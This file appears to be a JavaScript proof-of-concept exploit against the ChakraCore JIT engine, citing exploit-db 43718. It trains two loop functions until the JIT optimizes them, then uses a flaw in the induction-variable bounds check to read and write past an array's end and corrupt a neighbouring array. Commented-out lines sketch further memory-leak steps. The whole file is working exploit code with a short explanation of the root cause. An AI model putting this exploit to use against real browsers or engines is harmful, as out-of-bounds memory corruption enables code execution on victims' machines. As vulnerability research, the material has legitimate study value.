function hex(val, size=8) {
    return ('0'.repeat(size) + val.toString(16)).substr(-size);
}

function ReadUint64(view, offset) {
    const low = view.getUint32(offset, true);
    const high = view.getUint32(offset+4, true);
    return high * 0x100000000 + low;
}


function optWrite(arr, start, end, val) {
    for (let i = start; i < end; i++) {
        if (i === 1000) {
            i += 0; // <-- (a)
        }
        arr[i] = val; //2.3023e-320;
    }
    return 0;
}

function optRead(arr, start, end) {
    let x;
    for (let i = start; i < end; i++) {
        if (i === 10) {
            i += 0; // <-- (a)
        }
        x = arr[i];// = 5.40900888e-315; //2.3023e-320;
    }
    return x;
}


let arr = new Array(50);
let target = new Array(50);

let sup = [];
let foo = [];

function main() {
    arr.fill(1.1);
    target.fill(2.2);
    
    print("filled")
    for (let i = 0; i < 1000; i++) {
        optWrite(arr, 0, 3, 5.40900888e-315);
    }
    for (let i = 0; i < 1000; i++) {
        optRead(arr, 0, 3);
    }
    print("opt");

    for(let i = 51; i < 58; i++) {
        x = optRead(arr, 0, i);
        print("" + i + ": " + x);
    }

    print(target[0]);
    let idx = 54;
    optWrite(arr, idx, idx+1, 3.3);
    print(target[0]);

    for(let i = 51; i < 58; i++) {
        x = optRead(arr, 0, i);
        print("" + i + ": " + x);
    }

    // print("ret")
}

main();

// print(foo);
// print(arr[0] === 2.3023e-320 ? 'pass' : 'fail');

/*
https://www.exploit-db.com/exploits/43718/
What happens here is as follows:
In the loop prepass analysis, (a) is a valid add operation. 
It's a relative operation to "i", so Chakra thinks it's a valid loop.

The variable "i" now becomes an induction variable, and a LoopCount object is created.
When the LoopCount object is created, the ValueInfo of "i" is IntBounded which contains
relative bounds information. 
In the actual optimization phase, (a) gets optimized and becomes a load operation 
which directly loads 10 to "i". It's no more relative operation, therefore the 
ValueInfo of "i" is not to be IntBounded. But the LoopCount object has already been 
created with the previous information. This leads Chakra to fail computing bounds 
which may result in OOB read/write.
*/

// const haxxed = new Array(1.1, 2.2, 3.3);
// // const ab2 = new ArrayBuffer(96);
// // new Uint32Array(ab2)[0] = 0x13371337;
// // const ab3 = new ArrayBuffer(0x100);
// // new Uint32Array(ab3)[0] = 0x13381338;
// const arr1 = [0x13371337, haxxed, 0x41414141];
// const obj1 = { a: 0x13381338, b: haxxed, c: 0x42424242 };


// haxxed.haxxor();

// for(let i = 0; i < 0x100; i += 2) {
//     print("" + hex(i, 2) + ": " + hex(haxxed[i+1], 8) + hex(haxxed[i], 8));
// }
